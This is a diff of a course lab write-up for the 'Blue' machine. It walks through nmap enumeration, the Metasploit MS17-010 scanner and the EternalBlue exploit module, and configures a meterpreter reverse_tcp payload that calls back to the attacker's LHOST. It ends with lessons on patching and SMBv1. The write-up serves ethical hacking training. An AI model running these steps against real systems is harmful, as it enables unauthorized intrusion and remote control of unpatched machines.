@@ -1,43 +1,76 @@
+# 1st Capstone Machine
+This is my write-up for the first machine in the capstone section of the Practical Ethical Hacking course.
 ## Machine Information
 - **Name**: Blue
 - **Difficulty**: Easy
-- **OS**: Windows 7 Ultiamte
+- **OS**: Windows 7
   
 ## Tools Used
 - nmap
 - Metasploit
 
 ## Objectives
-- Scan machine for information
-- Identify vulnerability
-- Exploit vulnerability
+- Perform enumeration to identify open ports and services.
+- Discover any potential vulnerabilities.
+- Exploit the identified vulnerability to gain full access to the system.
 
 ## Enumeration
 I ran an nmap scan to check for open ports
 
 `nmap -A -vv <IP>`
 
-This told me port 135 is open running Windows RPC, port 139 is open running Windows netbios, and port 445 is open running SMB
+The scan results revealed the following open ports:
+- 135/tcp - Microsoft Windows RPC
+- 139/tcp - NetBIOS-ssn
+- 445/tcp - Microsoft Windows SMB
+
+The SMB service (port 445) caught my attention since it is commonly associated with known vulnerabilities, particularly on older versions of Windows like Windows 7.
 
 ## Vulnerability Discovery
-I looked up vulnerabilities for Windows 7 7601 and found a vulnerability called EternalBlue.
+Given that the machine is running Windows 7 (Build 7601), I researched known vulnerabilities for this specific version and identified a well-known vulnerability called EternalBlue (CVE-2017-0143), which exploits a flaw in SMBv1.
 
-I searched for EternalBlue on Exploit Database and found there was already an exploit for it.
+To verify if the machine was vulnerable, I used Metasploit:
 
-Running Metasploit, I searched for eternalblue and found an auxiliary for EternalBlue.
+1. I searched for the EternalBlue vulnerability module:
+   
+`search eternalblue`
 
-Using the auxiliary, I looked at the options and then set the RHOST to the target machine address and ran it.
+2. The search revealed an auxiliary scanner for MS17-010, the vulnerability that EternalBlue exploits.
 
-The auxiliary told me the machine is likely vulnerable to MS17-010.
+3. I set the target IP in the scanner to check if the system was vulnerable:
+
+   `use auxiliary/scanner/smb/smb_ms17_010`
+   
+    `set RHOSTS <target IP>`
+   
+    `run`
+
+The auxiliary scan confirmed that the target is likely vulnerable to MS17-010.
 
 ## Exploitation
-Metasploit already has an exploit for EternalBlue, using it I set the RHOST to the target machine address.
+After confirming the vulnerability, I proceeded to exploit it using Metasploit's EternalBlue exploit module.
 
-I want to have a nice, stabilized shell, so I set the payload to `windows/x64/meterpreter/reverse_tcp.
+1. I selected the appropriate exploit:
 
-After setting the LHOST to my IP address, I ran the exploit.
+   `use exploit/windows/smb/ms17_010_eternalblue`
 
-This gave me a reverse shell and by running the command whoami, I knew I had system privileges.
+2. I configured the necessary settings:
+- Set the target IP (RHOST).
+- Set my local IP as the LHOST.
+- Chose a payload for a stable reverse shell:
+
+  `set payload windows/x64/meterpreter/reverse_tcp`
+
+3. With everything set, I launched the exploit
+
+   `run`
 
 ## Lessons Learned
-This may be a simple attack, it is still relavant and common on organization's internal networks.
+While EternalBlue is a well-known and widely exploited vulnerability, it still serves as a reminder that unpatched, older systems, remain highly vulnerable to this type of attack. Even though the vulnerability is old, it continues to be a significant threat in many corporate environments where systems are not updated regularly.
+
+This machine reinforced the importance of:
+- Regular patching of critical vulnerabilities.
+- The risks posed by legacy systems still running outdated protocols like SMBv1.
+
+![image](https://github.com/user-attachments/assets/ec62b7c9-3ccb-4e17-95e2-b499e16e6a36)
+
